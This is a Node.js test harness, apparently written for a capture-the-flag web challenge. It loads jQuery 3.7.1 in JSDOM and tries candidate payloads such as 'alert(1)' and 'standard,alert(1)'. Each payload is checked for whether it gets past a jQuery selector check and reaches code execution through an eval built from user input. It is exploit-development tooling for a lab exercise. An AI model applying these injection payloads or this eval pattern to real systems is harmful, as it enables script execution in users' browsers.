// Use the EXACT jQuery 3.7.1 the challenge uses. Test candidate `format` payloads for
// (1) selector valid+empty, (2) eval runs window.__HIT__=true.
const fs = require("fs");
const { JSDOM } = require("jsdom");
const jquerySrc = fs.readFileSync(__dirname + "/jq371.js", "utf8");

function test(format) {
  const html = `<!DOCTYPE html><html><body>
  <form id="poly_x" data-formula="x+y">
    <input id="x_standard" name="x" value="1"><input id="y_standard" name="y" value="2">
    <input name="formula" value="x+y"><div id="template_standard" hidden>t</div>
  </form><pre id="answer"></pre></body></html>`;
  const dom = new JSDOM(html, { runScripts: "dangerously", pretendToBeVisual: true, url:"https://polynomial.secso.cc/" });
  const { window } = dom;
  const s = window.document.createElement("script"); s.textContent = jquerySrc; window.document.head.appendChild(s);
  const $ = window.$;
  const form = window.document.querySelector("form");
  form.id = "poly_" + format;
  const selected = form.id.replace("poly_", "");
  let res = { selLen:null, hit:false };
  try {
    const t = $("#template_" + selected);
    res.selLen = t.length;
    if (t.length === 0) {
      window.__HIT__ = false;
      window.type_standard = function(){ return "SAFE"; };
      try {
        window.eval("(function(){ var selected=" + JSON.stringify(selected) + "; " +
                    "return eval('type_'+selected+'(this, selected)'); }).call(document.querySelector('form'))");
        res.hit = !!window.__HIT__;
      } catch(e){ res.evalErr = e.message.split("\n")[0]; }
    } else { res.safe = true; }
  } catch(e){ res.selErr = e.message.split("\n")[0]; }
  return res;
}

const cands = process.argv.slice(2);
const defaults = [
  "alert(1)",
  "constructor.constructor(1)",
  "standard,alert(1)",
  ".x",
  "standard.x",
];
for (const c of (cands.length?cands:defaults)) {
  console.log(JSON.stringify(c), "=>", JSON.stringify(test(c)));
}
